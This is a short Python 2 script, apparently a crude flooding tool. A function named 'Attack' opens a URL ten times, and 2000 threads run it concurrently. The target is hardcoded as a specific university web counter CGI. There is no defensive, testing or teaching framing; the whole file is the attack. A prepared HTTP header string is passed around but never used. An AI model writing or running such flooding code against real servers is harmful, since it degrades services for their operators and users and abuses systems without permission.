import threading
import socket
import urllib2

def Attack(name, header):
    
    print "X"
    for i in range(10):
        response = urllib2.urlopen(name)
#        print "Reply:\n",response.read()
    
        response.close()

    
def Start(name,header):
    
    for i in range(2000):
        t = threading.Thread(target= Attack, args= (name, header))
        t.start()
    t.join()
    
name= "http://www.cc.puv.fi/~gc/cgi-bin/gcounter.cgi"

header = """\
GET / HTTP/1.1\r
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-us,en;q=0.5\r
Accept-Encoding: gzip,deflate\r
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r
Keep-Alive: 300\r
Connection: keep-alive\r
\r
"""
Start(name, header)
